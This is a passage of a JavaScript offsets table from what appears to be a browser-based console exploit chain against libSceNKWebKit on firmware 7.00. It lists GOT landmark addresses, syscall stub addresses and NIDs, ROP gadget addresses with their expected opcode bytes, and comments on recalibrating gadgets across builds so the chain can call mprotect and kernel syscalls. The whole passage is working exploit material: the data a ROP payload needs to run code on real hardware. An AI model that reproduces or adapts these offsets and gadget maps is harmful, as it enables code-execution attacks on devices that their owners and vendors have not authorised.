	[0x19e4130, 0x3d366a8],
	[0x1a76e30, 0x3d32ae8],
	[0x1affa50, 0x3dbc5c8],
	[0x1b94c10, 0x3d38828],
	[0x1c95f10, 0x3d6d398],
	[0x1cefa10, 0x3d78400],
	[0x1d65160, 0x3d35c68],
	[0x1e94040, 0x3dbdc48],
	[0x1e961a0, 0x3d86e90],
	[0x1f35720, 0x3d95688],
	[0x1fcf4d0, 0x3d910a0],
	[0x206bcf0, 0x3d0e428],
	[0x2108c50, 0x3d2ffc0],
	[0x21b5620, 0x3d32578],
	[0x2246960, 0x3d327c0],
	[0x22ffc60, 0x3d39bc8],
	[0x23861d0, 0x3d39468],
	[0x2466250, 0x3d766b0],
	[0x2488370, 0x3d62368],
	[0x24c6fe0, 0x3dde9e8],
	[0x2551200, 0x3d91738],
	[0x25ed8f0, 0x3d77ec0],
	[0x2690480, 0x3d3b390],
	[0x2733d50, 0x3d3ce08],
	[0x27c43e0, 0x3d3d430],
	[0x28604d0, 0x3d9a9e8],
	[0x2900840, 0x3d9e310],
	[0x299d080, 0x3d47dd8],
	[0x2a4e800, 0x3d42f70],
	[0x2ad7be0, 0x3d47180],
	[0x2b6de70, 0x3d4bf98],
	[0x2c11190, 0x3d4fae0],
	[0x2ca7600, 0x3d5b270],
	[0x2d54190, 0x3dbda88],
	[0x2d62140, 0x3d535b0],
	[0x2de2560, 0x3d54e60],
	[0x2e80290, 0x3d5a368],
	[0x2f215e0, 0x3df5f28],
	[0x2fb9cc0, 0x3de3618],
	[0x3060cf0, 0x3d5aba0],
	[0x30eefe0, 0x3e03700],
	[0x318b860, 0x3def1d8],
	[0x3229190, 0x3e0b1d8],
	[0x32d4aa0, 0x3d8d7d0],
	[0x33614f0, 0x3d65628],
	[0x33fe0b0, 0x3d65cc8],
	[0x349ac20, 0x3d66528],
	[0x3537550, 0x3d66a28],
	[0x35d3740, 0x3d66fb0],
	[0x35f9050, 0x3d97568],
	[0x366efa0, 0x3e147c0]
];

const OFFSET_lk_shift_probe = [
	[0x7a00, 0x60e50],
	[0x8ca0, 0x60e60],
	[0x10790, 0x60e58],
	[0x33830, 0x60eb0],
	[0x35ca0, 0x60e68],
	[0x35dda, 0x642e8],
	[0x365ba, 0x642f0],
	[0x3696e, 0x642f8],
	[0x36a03, 0x64300],
	[0x36a24, 0x64308],
	[0x36eb7, 0x64310],
	[0x3777a, 0x64318],
	[0x3799a, 0x64320],
	[0x37caa, 0x64328],
	[0x383b0, 0x60e70],
	[0x3854d, 0x64338],
	[0x387b0, 0x60e78]
];

const OFFSET_lk_shift_control = [
	[0x59bfb, 0x603b8],
	[0x5a52d, 0x60328],
	[0x5b022, 0x60238],
	[0x5b89b, 0x605f8],
	[0x5c2b6, 0x60bd0],
	[0x5cb07, 0x60028],
	[0x5d348, 0x60da0],
	[0x5dc83, 0x60d90]
];

/* ---------------------------------------------------------------------------
 * Runtime landmarks: the import GOT as a ruler.
 *
 * libSceNKWebKit imports hundreds of functions from libkernel_web and
 * libSceLibcInternal, and the loader fills each GOT slot with the callee's
 * address IN THE BUILD THE CONSOLE IS ACTUALLY RUNNING. Those slots are in
 * readable data. So for any imported export we know from 7_00_00_44:
 *
 *     shift(fn) = read8(wkBase + slot + 0x4000) - lkBase - rva_in_our_file
 *
 * That measures TEXT displacement without ever reading text -- which matters,
 * because libSceNKWebKit's text is PF_X only and reading it kills the
 * WebProcess. It is also far denser than the module's own relative
 * relocations: 17 of those in libkernel_web against 85 imports.
 *
 * The first on-hardware profile showed libkernel_web is NOT a single shift but
 * a staircase -- +0xe0, +0x250, +0x540, +0x560, +0x580 -- and the last three
 * steps fall inside the syscall stub block. Stubs are 0x20 apart, so each
 * +0x20 is one stub 7.00.00.70 has that 7.00.00.44 does not; that is exactly
 * why getpid came back as -1 rather than faulting. A single delta could never
 * have fixed it.
 * ------------------------------------------------------------------------- */
// [rva_in_7_00_00_44, wk GOT slot] for every libkernel_web export
// libSceNKWebKit imports. Read at wkBase + slot + 0x4000.
const OFFSET_lk_import_landmarks = [
	[0x12f0, 0x3e15850],
	[0x29f0, 0x3e156d8],
	[0x3190, 0x3e15770],
	[0x3380, 0x3e157b0],
	[0x3fa0, 0x3e14cd0],
	[0x6f40, 0x3e156d0],
	[0x7a00, 0x3e157c8],
	[0x7bc0, 0x3e155d0],
	[0x8100, 0x3e15738],
	[0x84a0, 0x3e15748],
	[0x85e0, 0x3e16e68],
	[0x8b50, 0x3e14c98],
	[0x8ca0, 0x3e157f8],
	[0x91f0, 0x3e15700],
	[0x9770, 0x3e149c8],
	[0xa3b0, 0x3e149f0],
	[0xab30, 0x3e155d8],
	[0xbbb0, 0x3e15810],
	[0xc8d0, 0x3e15818],
	[0xe080, 0x3e157d8],
	[0xf560, 0x3e14cc8],
	[0xf760, 0x3e149a8],
	[0x10790, 0x3e157e8],
	[0x10cf0, 0x3e157b8],
	[0x129a0, 0x3e149d0],
	[0x13230, 0x3e16e80],
	[0x13bb0, 0x3e155f0],
	[0x145d0, 0x3e15820],
	[0x15040, 0x3e15840],
	[0x15530, 0x3e14cb0],
	[0x16140, 0x3e15760],
	[0x16230, 0x3e16e60],
	[0x17150, 0x3e15800],
	[0x171b0, 0x3e15740],
	[0x174e0, 0x3e157e0],
	[0x182b0, 0x3e157a8],
	[0x18f00, 0x3e15838],
	[0x1ac40, 0x3e16e70],
	[0x1d920, 0x3e15600],
	[0x1e300, 0x3e155e8],
	[0x1e7b0, 0x3e14998],
	[0x1f520, 0x3e15758],
	[0x214c0, 0x3e16e78],
	[0x21580, 0x3e149b0],
	[0x219b0, 0x3e14ce0],
	[0x233c0, 0x3e15778],
	[0x23760, 0x3e14ce8],
	[0x23c60, 0x3e15830],
	[0x25c50, 0x3e155b8],
	[0x26be0, 0x3e15608],
	[0x276b0, 0x3e155c8],
	[0x29000, 0x3e15768],
	[0x2dbc0, 0x3e157f0],
	[0x2e760, 0x3e149e0],
	[0x2ef40, 0x3e157c0],
	[0x2fe50, 0x3e15790],
	[0x30150, 0x3e15780],
	[0x327d0, 0x3e14a90],
	[0x32820, 0x3e157a0],
	[0x33500, 0x3e155f8],
	[0x336f0, 0x3e14990],
	[0x337b0, 0x3e15808],
	[0x35590, 0x3e157d0],
	[0x357f0, 0x3e156c8],
	[0x35de0, 0x3e14cb8],
	[0x35f00, 0x3e15470],
	[0x36420, 0x3e14ca8],
	[0x36760, 0x3e149a0],
	[0x36820, 0x3e14c90],
	[0x369d0, 0x3e16e40],
	[0x36ae0, 0x3e149e8],
	[0x36ba0, 0x3e14d00],
	[0x36c80, 0x3e15828],
	[0x37130, 0x3e14b50],
	[0x37410, 0x3e14c40],
	[0x377f0, 0x3e149c0],
	[0x37c40, 0x3e15730],
	[0x37d40, 0x3e15708],
	[0x37ee0, 0x3e14ca0],
	[0x38020, 0x3e14c60],
	[0x380c0, 0x3e14cc0],
	[0x38420, 0x3e154b0],
	[0x385f0, 0x3e15478],
	[0x38690, 0x3e149f8],
	[0x386d0, 0x3e154a8]
];

// Same for libSceLibcInternal. setjmp/longjmp already work, so
// this is expected to be flat -- it is here to notice if it is not.
const OFFSET_lc_import_landmarks = [
	[0x470, 0x3e14db0],
	[0xfa0, 0x3e15570],
	[0x3bc0, 0x3e14d50],
	[0x43c0, 0x3e14db8],
	[0x4800, 0x3e14d98],
	[0x51b0, 0x3e15518],
	[0x5ca0, 0x3e15680],
	[0x5e80, 0x3e15b98],
	[0x5ee0, 0x3e16e20],
	[0x151c0, 0x3e14dc8],
	[0x15be0, 0x3e15668],
	[0x15d40, 0x3e16e58],
	[0x17270, 0x3e14d80],
	[0x17650, 0x3e14c68],
	[0x1b6f0, 0x3e14c00],
	[0x1b960, 0x3e154b8],
	[0x1c030, 0x3e14c48],
	[0x1c890, 0x3e14a00],
	[0x1d250, 0x3e14c10],
	[0x1d6f0, 0x3e14c18],
	[0x1db00, 0x3e14af8],
	[0x1e3d0, 0x3e14ae0],
	[0x1e780, 0x3e152d0],
	[0x40860, 0x3e14ab0],
	[0x40c50, 0x3e15578],
	[0x41710, 0x3e15848],
	[0x43970, 0x3e15248],
	[0x43ea0, 0x3e16f18],
	[0x444e0, 0x3e15278],
	[0x459e0, 0x3e15298],
	[0x462d0, 0x3e152b8],
	[0x47300, 0x3e15260],
	[0x47e80, 0x3e16f50],
	[0x49860, 0x3e16f68],
	[0x4a8c0, 0x3e14a88],
	[0x4a960, 0x3e14b38],
	[0x4cf90, 0x3e15ce0],
	[0x4da10, 0x3e16f80],
	[0x4f390, 0x3e149d8],
	[0x507b0, 0x3e16ed0],
	[0x53510, 0x3e155a0],
	[0x55010, 0x3e16f30],
	[0x559b0, 0x3e16ec8],
	[0x57ac0, 0x3e15290],
	[0x5a010, 0x3e15280],
	[0x5af10, 0x3e15e20],
	[0x5cfe0, 0x3e14da8],
	[0x60aa0, 0x3e14dd8],
	[0x61470, 0x3e14b88],
	[0x683e0, 0x3e16d50],
	[0x6e5a0, 0x3e14c70],
	[0x71cb0, 0x3e15728],
	[0x72bf0, 0x3e15710],
	[0x75070, 0x3e155e0],
	[0x754f0, 0x3e14c78],
	[0x76780, 0x3e14dc0],
	[0x83bc0, 0x3e14950],
	[0x88080, 0x3e15618],
	[0x88130, 0x3e14d10],
	[0x892c0, 0x3e154e0],
	[0x894d0, 0x3e154f8],
	[0x898c0, 0x3e154e8],
	[0x8ea00, 0x3e154c0],
	[0x90ab0, 0x3e15560],
	[0xbe100, 0x3e15528],
	[0xca960, 0x3e16f38],
	[0xcce60, 0x3e16f40]
];

// [syscall number, wk GOT slot] -- these 21 stubs are imported by
// name, so their console address is READ, not derived: no bracket, no
// interpolation, no assumption that the stub grid is unchanged.
// 0x14 (getpid) is one of them, which is the one prepare() blocks on.
const OFFSET_lk_syscall_landmarks = [
	[0x1, 0x3e14c40],
	[0x14, 0x3e149a0],
	[0x20, 0x3e14cc0],
	[0x29, 0x3e15730],
	[0x49, 0x3e149e8],
	[0x4b, 0x3e16e40],
	[0x4e, 0x3e14d00],
	[0x61, 0x3e14c90],
	[0x68, 0x3e14ca0],
	[0x69, 0x3e14b50],
	[0x6a, 0x3e14ca8],
	[0x74, 0x3e15478],
	[0x75, 0x3e154a8],
	[0x76, 0x3e14cb8],
	[0x80, 0x3e15708],
	[0x87, 0x3e149c0],
	[0xbc, 0x3e14c60],
	[0xbd, 0x3e154b0],
	[0xe8, 0x3e15470],
	[0x14b, 0x3e15828],
	[0x1e2, 0x3e149f8]
];

// Extra libSceNKWebKit probes across 0x44a1a0..0x4c6ea0, the window
// the first run left unresolved. pop r8 0x4c5d31 sits inside it, and
// applying a shift while its side of the cut was unknown is what
// turned getpid returning -1 into a SIGILL.
const OFFSET_wk_shift_probe_gap = [
	[0x44a1a0, 0x3cd8358],
	[0x44c830, 0x3d46310],
	[0x451a10, 0x3d0ed40],
	[0x452090, 0x3cd9bf8],
	[0x455690, 0x3ce6240],
	[0x456530, 0x3d4aa80],
	[0x458510, 0x3d4aa40],
	[0x45f5b0, 0x3cd9bd0],
	[0x466190, 0x3ce01f0],
	[0x468b00, 0x3d920b0],
	[0x46a800, 0x3d8e268],
	[0x46cbb0, 0x3d45dd0],
	[0x46ef60, 0x3d91a10],
	[0x46ff30, 0x3c4ff88],
	[0x473c90, 0x3da4258],
	[0x476fb0, 0x3c686f8],
	[0x478380, 0x3d5b0f8],
	[0x47d3e0, 0x3cec258],
	[0x47dd30, 0x3d5b1f8],
	[0x47fc30, 0x3ce3bb8],
	[0x482090, 0x3cd7f98],
	[0x483ed0, 0x3cd8370],
	[0x486800, 0x3d4c7d8],
	[0x487b80, 0x3d551e8],
	[0x48d3d0, 0x3d55218],
	[0x48ede0, 0x3ce6740],
	[0x48fc70, 0x3d18950],
	[0x4922f0, 0x3ce5ac8],
	[0x494710, 0x3d54ec8],
	[0x4981e0, 0x3d8e598],
	[0x499760, 0x3d8e390],
	[0x49cd20, 0x3d54fd0],
	[0x49f890, 0x3d8e568],
	[0x4a1750, 0x3cd7a18],
	[0x4bd900, 0x3d20d60],
	[0x4bf0c0, 0x3ce1398],
	[0x4c1750, 0x3dac298],
	[0x4c3710, 0x3d543e0],
	[0x4c58f0, 0x3d5b268],
	[0x4c6ea0, 0x3ce14a0]
];


// [libkernel_web rva in 7_00_00_44, libSceLibcInternal GOT slot].
// libc imports 132 of libkernel_web's exports, 34 of them inside the
// syscall stub block against WebKit's 21, and libc's GOT is equally
// readable -- more landmarks, fewer stubs stranded inside a step.
// Read at lcBase + slot + (bias detected at runtime; libc's own text
// measured flat, so 0 is expected).
const OFFSET_lk_landmarks_via_lc = [
	[0x330, 0x12c148],
	[0x5f0, 0x12c090],
	[0xe60, 0x12c190],
	[0x12f0, 0x12c3e0],
	[0x2210, 0x12c080],
	[0x26d0, 0x12c1d0],
	[0x29f0, 0x12c2f8],
	[0x2fa0, 0x12c1e0],
	[0x2fd0, 0x12c180],
	[0x34b0, 0x12c158],
	[0x34d0, 0x12c298],
	[0x3c30, 0x12c188],
	[0x5270, 0x12c0a0],
	[0x6f40, 0x12c308],
	[0x73a0, 0x12c498],
	[0x7b70, 0x12c210],
	[0x7cf0, 0x12c0d0],
	[0x8100, 0x12c238],
	[0x83a0, 0x12c2b8],
	[0x84a0, 0x12c1f0],
	[0x8ca0, 0x12c2a8],
	[0xa2e0, 0x12c4c0],
	[0xa3b0, 0x12c390],
	[0xaab0, 0x12c0b8],
	[0xbb60, 0x12c100],
	[0xbd20, 0x12c140],
	[0xc8b0, 0x12c1b0],
	[0xd860, 0x12c278],
	[0xdfd0, 0x12c1c0],
	[0xe220, 0x12c0d8],
	[0xe2a0, 0x12c2d0],
	[0xe820, 0x12c488],
	[0xea90, 0x12c490],
	[0xedb0, 0x12c450],
	[0xf0e0, 0x12c280],
	[0xfd40, 0x12c1a8],
	[0x10790, 0x12c2a0],
	[0x109f0, 0x12c3c0],
	[0x10d90, 0x12c200],
	[0x10fc0, 0x12c3f8],
	[0x12140, 0x12c250],
	[0x12a10, 0x12c070],
	[0x145d0, 0x12c3d0],
	[0x14a40, 0x12c0f8],
	[0x14ec0, 0x12c110],
	[0x15f10, 0x12c4a0],
	[0x16140, 0x12c2f0],
	[0x16230, 0x12c198],
	[0x17040, 0x12c138],
	[0x175e0, 0x12c160],
	[0x176c0, 0x12c0e8],
	[0x18350, 0x12c120],
	[0x183a0, 0x12c2d8],
	[0x18970, 0x12c1d8],
	[0x1a420, 0x12c318],
	[0x1ac40, 0x12c068],
	[0x1c810, 0x12c1a0],
	[0x1cd80, 0x12c4a8],
	[0x1d730, 0x12c128],
	[0x1e3b0, 0x12c060],
	[0x1e670, 0x12c3b0],
	[0x1e7b0, 0x12c078],
	[0x20220, 0x12c0b0],
	[0x20530, 0x12c0f0],
	[0x22020, 0x12c0c0],
	[0x22570, 0x12c2e0],
	[0x228e0, 0x12c3a8],
	[0x22b00, 0x12c108],
	[0x23480, 0x12c150],
	[0x23e30, 0x12c288],
	[0x24710, 0x12c1c8],
	[0x258b0, 0x12c2b0],
	[0x258d0, 0x12c478],
	[0x26780, 0x12c1e8],
	[0x26ad0, 0x12c4b0],
	[0x26fd0, 0x12c168],
	[0x27330, 0x12c340],
	[0x27b60, 0x12c300],
	[0x28f40, 0x12c1b8],
	[0x29000, 0x12c310],
	[0x295f0, 0x12c0e0],
	[0x29800, 0x12c208],
	[0x29890, 0x12c178],
	[0x2a120, 0x12c2e8],
	[0x2a2c0, 0x12c3d8],
	[0x2bc70, 0x12c1f8],
	[0x2be90, 0x12c118],
	[0x2c4f0, 0x12c290],
	[0x2c8a0, 0x12c0c8],
	[0x2d400, 0x12c0a8],
	[0x2e0f0, 0x12c260],
	[0x2e290, 0x12c170],
	[0x2e940, 0x12c2c0],
	[0x30170, 0x12c258],
	[0x32f90, 0x12c098],
	[0x337b0, 0x12c3c8],
	[0x338c0, 0x12c088],
	[0x33940, 0x12c2c8],
	[0x35cd0, 0x12c460],
	[0x35e40, 0x12c430],
	[0x35f00, 0x12c3b8],
	[0x35fa0, 0x12c410],
	[0x36040, 0x12c458],
	[0x360c0, 0x12c370],
	[0x36100, 0x12c418],
	[0x36540, 0x12c220],
	[0x365e0, 0x12c218],
	[0x36740, 0x12c398],
	[0x36760, 0x12c058],
	[0x367c0, 0x12c240],
	[0x367e0, 0x12c408],
	[0x36be0, 0x12c228],
	[0x36de0, 0x12c348],
	[0x370f0, 0x12c388],
	[0x37210, 0x12c230],
	[0x37270, 0x12c4b8],
	[0x37290, 0x12c480],
	[0x37410, 0x12c270],
	[0x37570, 0x12c468],
	[0x377b0, 0x12c438],
	[0x37890, 0x12c428],
	[0x378b0, 0x12c330],
	[0x37970, 0x12c3f0],
	[0x37ae0, 0x12c338],
	[0x37e20, 0x12c268],
	[0x37f20, 0x12c248],
	[0x37f40, 0x12c380],
	[0x37fc0, 0x12c420],
	[0x38020, 0x12c360],
	[0x38420, 0x12c368],
	[0x385f0, 0x12c130],
	[0x386d0, 0x12c3a0]
];

// What each gadget must decode to. The instruction a name claims is
// build-independent -- only its address moves -- so once mprotect makes
// text readable these are what the on-console audit compares against,
// which replaces inferring a gadget's validity from whether the process
// survived running it.
const OFFSET_wk_gadget_bytes = {
	"ret": "c3",
	"pop rdi": "5fc3",
	"pop rsi": "5ec3",
	"pop rdx": "5ac3",
	"pop rcx": "59c3",
	"pop rax": "58c3",
	"pop rsp": "5cc3",
	"pop r8": "4158c3",
	"pop r9": "4531c94d85c90f95c0c3",
	"mov [rdi], rsi": "488937c3",
	"mov [rdi], rax": "488907c3",
	"mov [rdi], eax": "8907c3",
	"mov rax, [rax]": "488b00c3",
	"add rax, rcx": "4801c8c3",
	"cmp [rcx], eax": "3b01c3",
	"inc dword [rax]": "ff00c3",
	"seta al": "0f97c0c3",
	"setb al": "0f92c0c3",
	"sete al": "0f94c0c3",
	"setg al": "0f9fc0c3",
	"setl al": "0f9cc0c3",
	"shl rax, 3": "48c1e003c3",
	"shl rax, 4": "48c1e004c3",
	"shr rax, 3": "48c1e803c3",
	"shr rax, 4": "48c1e804c3",
	"infloop": "ebfe"
};

// Read text after making it readable, and audit instead of guessing.
const OFFSET_wk_text_audit = true;

/* ---------------------------------------------------------------------------
 * Gadgets taken from libSceLibcInternal instead of libSceNKWebKit.
 *
 * `pop rdx` 0x21461c is `5a c3` in 7_00_00_44 and every landmark around it
 * measures +0x0, yet it crashes the chain on 7.00.00.70. That is not a
 * contradiction: a same-SIZE change moves nothing, so it is invisible to a
 * displacement measurement by construction. Landmarks can only find what
 * shifted.
 *
 * It also blocks the fix. mprotect takes three arguments, so fcall() emits
 * `pop rdx` -- which means the text cannot be made readable without the very
 * gadget the read is meant to identify. The crumb trail says exactly that:
 * mp-lk, then w1/w2/armed/pm, then death.
 *
 * libSceLibcInternal is the way out. It measured FLAT over 66 landmarks --
 * byte-identical between .44 and .70 -- so an address in it needs no shift and
 * no audit, and it has two `5a c3` sites. Nothing else in the chain has to
 * change: a gadget is just an address, and rop.js never cared which module it
 * came from.
 *
 * 0x57c87 is the spare if 0x51592 ever turns out to be inside something that
 * did change.
 * ------------------------------------------------------------------------- */
let lc_gadgetmap = {
	"pop rdx": 0x51592,
};

// [rva in 7_00_00_44, syscall number, NID] for every syscall stub
// libkernel_web exports by name. If sys_dynlib_dlsym works on this devkit
// it resolves each of these to its REAL address, which pins every step of
// the staircase exactly -- including the 0x36100..0x36420 window where all
// 25 stubs had to be dropped because no import landmark falls inside it.
// 0x363c0 (KIbJFQ0I1Cg) is the one that matters most: it sits between the
// two stubs poops needs, 0x2AF at 0x363a0 and 0x1AF at 0x363e0.
const OFFSET_lk_stub_nids = [
	[0x35cd0, 0x8a, "GDuV00CHrUg"],
	[0x35cd0, 0x8a, "GDuV00CHrUg"],
	[0x35de0, 0x76, "6O8EwYOgH9Y"],
	[0x35de0, 0x76, "6O8EwYOgH9Y"],
	[0x35de0, 0x76, "cL2QUlo9Vnk"],
	[0x35e00, 0x7, "RFlsu7nfopM"],
	[0x35e20, 0x64, "miQ1wVwSexE"],
	[0x35e40, 0xb7, "HTxb6gmexa0"],
	[0x35e60, 0x56, "J1H1QRCJf2Q"],
	[0x35ec0, 0x227, "kPGXeSQeoWc"],
	[0x35ee0, 0x26e, "Hk7iHmGxB18"],
	[0x35f00, 0xe8, "lLMT9vJAck0"],
	[0x35f00, 0xe8, "lLMT9vJAck0"],
	[0x35f80, 0x1f, "TXFFFiNldU8"],
	[0x35f80, 0x1f, "TXFFFiNldU8"],
	[0x35f80, 0x1f, "rTNM7adVYog"],
	[0x35fa0, 0x149, "puT82CSQzDE"],
	[0x36000, 0xa5, "b7uXQmnfB2s"],
	[0x36020, 0x234, "iZFJYJJoZS8"],
	[0x36040, 0x53, "hPWDGx8ioXQ"],
	[0x36060, 0x4f, "3yjZbSvan2g"],
	[0x360c0, 0x1f3, "bGVEgWXy6dg"],
	[0x36100, 0x2f, "AfuS23bX6kg"],
	[0x36140, 0x253, "GQli4UAXTfQ"],
	[0x36160, 0x1e, "B+zfF7bMswI"],
	[0x361c0, 0x26b, "EeVthQocE3Y"],
	[0x361e0, 0x16b, "RW-GEfpnsqg"],
	[0x361e0, 0x16b, "RW-GEfpnsqg"],
	[0x36220, 0x14c, "CBNtXOoef-E"],
	[0x36220, 0x14c, "CBNtXOoef-E"],
	[0x36260, 0x17, "JVmUZwK-HJU"],
	[0x36280, 0x25e, "O-hEvSnv2o4"],
	[0x362a0, 0x188, "PlmVIwQdarI"],
	[0x362c0, 0x197, "rOT0UMvtCCA"],
	[0x36300, 0x190, "pv9M2jHJ6iw"],
	[0x36320, 0x35, "sHziAegVp74"],
	[0x36320, 0x35, "sHziAegVp74"],
	[0x36340, 0x14d, "m0iS6jNsXds"],
	[0x36340, 0x14d, "m0iS6jNsXds"],
	[0x36380, 0x25c, "7OpNDDNMJyo"],
	[0x363c0, 0x292, "KIbJFQ0I1Cg"],
	[0x36420, 0x6a, "6EYF3tXjXbU"],
	[0x36420, 0x6a, "pxnCmagrtao"],
	[0x36420, 0x6a, "pxnCmagrtao"],
	[0x36440, 0x194, "TEwqtzAmezo"],
	[0x36480, 0x36, "PfccT7qURYE"],
	[0x36480, 0x36, "PfccT7qURYE"],
	[0x36480, 0x36, "PfccT7qURYE"],
	[0x36480, 0x36, "PfccT7qURYE"],
	[0x36480, 0x36, "wW+k21cmbwQ"],
	[0x364c0, 0x217, "XujojypwYYc"],
	[0x36520, 0x28e, "99XpfyBTg9c"],
	[0x36540, 0x4, "FxVZqBAA7ks"],
	[0x36570, 0x14e, "PrsRaaSO-X0"],
	[0x365b0, 0x2a, "-Jp7F+pXxNg"],
	[0x365b0, 0x2a, "-Jp7F+pXxNg"],
	[0x365e0, 0x3, "DRuBt2pvICk"],
	[0x36600, 0x50, "M8VZ3iIlmyg"],
	[0x36640, 0x230, "zdaF5N-Xe2M"],
	[0x36660, 0x27, "e6ovBo9ZvJc"],
	[0x366c0, 0xec, "Uyss1eAFtWo"],
	[0x366e0, 0x144, "x7g7Ebeo8-U"],
	[0x366e0, 0x144, "x7g7Ebeo8-U"],
	[0x36740, 0x18d, "17Mfe1B3X6U"],
	[0x36760, 0x14, "HoLVWNanBBc"],
	[0x36760, 0x14, "HoLVWNanBBc"],
	[0x36780, 0x28d, "JVgZfJt3ZqQ"],
	[0x367c0, 0x89, "c7ZnT7V1B98"],
	[0x367c0, 0x89, "c7ZnT7V1B98"],
	[0x367e0, 0x147, "yawdym+zDvw"],
	[0x367e0, 0x147, "yawdym+zDvw"],
	[0x36800, 0x272, "IglowNcOePQ"],
	[0x36820, 0x61, "TU-d9PfIHPM"],
	[0x36820, 0x61, "TU-d9PfIHPM"],
	[0x36860, 0xce, "+0EDo7YzcoU"],
	[0x36860, 0xce, "+0EDo7YzcoU"],
	[0x36880, 0x259, "LYbbZxXNAns"],
	[0x368a0, 0x275, "n371J5cP+uo"],
	[0x368e0, 0x293, "P0jjY6bxakI"],
	[0x36900, 0xc3, "4X0QwvuCfjc"],
	[0x36900, 0xc3, "4X0QwvuCfjc"],
	[0x36920, 0x1e6, "DGY7qWLcHGA"],
	[0x369b0, 0x1ad, "mrbHXqK8wkg"],
	[0x369d0, 0x4b, "Jahsnh4KKkg"],
	[0x369d0, 0x4b, "Jahsnh4KKkg"],
	[0x36a40, 0x2cc, "Tzmvl2b3kLA"],
	[0x36a60, 0x7c, "n01yNbQO5W4"],
	[0x36a60, 0x7c, "n01yNbQO5W4"],
	[0x36a80, 0xef, "tj-nUlJCp-8"],
	[0x36ac0, 0x25d, "jTPE1AS7uak"],
	[0x36ae0, 0x49, "UqDGjXA5yUM"],
	[0x36ae0, 0x49, "UqDGjXA5yUM"],
	[0x36b60, 0x136, "gokWod7GAH4"],
	[0x36b80, 0x22e, "E7CmfLfeSuQ"],
	[0x36ba0, 0x4e, "+hFjyohmOU0"],
	[0x36bc0, 0x25, "W0xkN0+ZkCE"],
	[0x36bc0, 0x25, "W0xkN0+ZkCE"],
	[0x36be0, 0x5, "6c3rCVE-fTU"],
	[0x36c20, 0x19, "tvpHe5kBO4E"],
	[0x36c60, 0x291, "-pOg5A6Yr6g"],
	[0x36c80, 0x14b, "6XG4B33N09g"],
	[0x36c80, 0x14b, "6XG4B33N09g"],
	[0x36cc0, 0x1b, "PcKApW9kVoQ"],
	[0x36d20, 0xc2, "Wh7HbV7JFqc"],
	[0x36d20, 0xc2, "Wh7HbV7JFqc"],
	[0x36d40, 0x83, "9eMlfusH4sU"],
	[0x36d40, 0x83, "9eMlfusH4sU"],
	[0x36dc0, 0x7f, "ROILLZdYZPc"],
	[0x36de0, 0xbe, "DRGXpDDh8Ng"],
	[0x36de0, 0xbe, "DRGXpDDh8Ng"],
	[0x36e00, 0x72, "t+rTx5NW+qU"],
	[0x36e20, 0x14a, "SD7oNCIQWvE"],
	[0x36e60, 0x122, "FCcmRZhWtOk"],
	[0x36e60, 0x122, "FCcmRZhWtOk"],
	[0x36e80, 0x22d, "3CNY4Z0Luc8"],
	[0x36ed0, 0x79, "YSHRBRLn2pI"],
	[0x36ef0, 0x1c, "+L22kkFiXok"],
	[0x36f10, 0x25a, "n0ErFZ2hmKs"],
	[0x36f90, 0x1d2, "2I2RV6LyNng"],
	[0x36fb0, 0x233, "MGrj20+EK+U"],
	[0x36fd0, 0x60, "TUC9xC1YQjs"],
	[0x37030, 0x235, "vS-RnoD1BSY"],
	[0x37050, 0x236, "ztNqqNCl1Tw"],
	[0x37070, 0x78, "+WRlkKjZvag"],
	[0x37090, 0x191, "s8gWJrY1W-k"],
	[0x370b0, 0x276, "AUqJNkobQ1c"],
	[0x370f0, 0x5c, "8nY19bKoiZk"],
	[0x370f0, 0x5c, "8nY19bKoiZk"],
	[0x370f0, 0x5c, "t0fXUzq61Z4"],
	[0x37130, 0x69, "a4KKvF-ME4M"],
	[0x37130, 0x69, "fFxGkxF2bVo"],
	[0x37130, 0x69, "fFxGkxF2bVo"],
	[0x37150, 0x252, "nZHk+lpqwVQ"],
	[0x37210, 0x6, "NNtFaKJbPt0"],
	[0x37270, 0x214, "7NwggrWJ5cA"],
	[0x37290, 0xf, "z0dtnPxYgtg"],
	[0x37290, 0xf, "z0dtnPxYgtg"],
	[0x372b0, 0x8d, "2M+dFM8Wmq4"],
	[0x372d0, 0x7d, "X86Q0qQJ1m0"],
	[0x37310, 0x218, "YbAunrti+54"],
	[0x37350, 0x24b, "igMefp4SAv0"],
	[0x37370, 0xe9, "d7nUj1LOdDU"],
	[0x373b0, 0xcb, "mTBZfEal2Bw"],
	[0x373b0, 0xcb, "mTBZfEal2Bw"],
	[0x373f0, 0x25f, "p2xgfB-30g8"],
	[0x37410, 0x1, "6Z83sYWFlA8"],
	[0x37430, 0x71, "pG70GT5yRo4"],
	[0x37450, 0x148, "O6gKl8uvGyE"],
	[0x37450, 0x148, "O6gKl8uvGyE"],
	[0x37530, 0x2cd, "lCp17SqY3Nc"],
	[0x37570, 0x88, "JGMio+21L4c"],
	[0x37570, 0x88, "JGMio+21L4c"],
	[0x37590, 0x27d, "mm0znr-xjqI"],
	[0x375b0, 0x287, "fi+JX2wq2XU"],
	[0x37630, 0x2d5, "tGtH2GTWbyE"],
	[0x376d0, 0x59, "sZuwaDPATKs"],
	[0x376d0, 0x59, "sZuwaDPATKs"],
	[0x37730, 0x23, "UJrQCyYpyic"],
	[0x37730, 0x23, "UJrQCyYpyic"],
	[0x377b0, 0xc0, "cZq1zIzFN7s"],
	[0x377f0, 0x87, "MZb0GKT3mo8"],
	[0x377f0, 0x87, "MZb0GKT3mo8"],
	[0x377f0, 0x87, "MZb0GKT3mo8"],
	[0x377f0, 0x87, "MZb0GKT3mo8"],
	[0x37870, 0x4a, "YQOfxL4QfeU"],
	[0x37870, 0x4a, "YQOfxL4QfeU"],
	[0x37890, 0x18, "kg4x8Prhfxw"],
	[0x378b0, 0xc, "6mMQ1MSPW-Q"],
	[0x378b0, 0xc, "6mMQ1MSPW-Q"],
	[0x378d0, 0x62, "KFDGyLj80MY"],
	[0x378f0, 0xee, "mZlElqorITk"],
	[0x37910, 0x280, "ByogDrS-Xw8"],
	[0x37930, 0x121, "ZaRzaapAZwM"],
	[0x37930, 0x121, "ZaRzaapAZwM"],
	[0x37950, 0x192, "rQvMIxmFD6A"],
	[0x37970, 0x3b, "-3nj+K1elI0"],
	[0x37970, 0x3b, "kdguLiAheLI"],
	[0x37a40, 0x1b9, "vE+WlomLSh4"],
	[0x37a60, 0x1d, "gPcQ3OrFBUA"],
	[0x37a80, 0xfd, "AxUhC3zNrhk"],
	[0x37ac0, 0x237, "h+4DJpAXs4I"],
	[0x37ae0, 0x5a, "W8f1adVl+48"],
	[0x37ae0, 0x5a, "wdUufa9g-D8"],
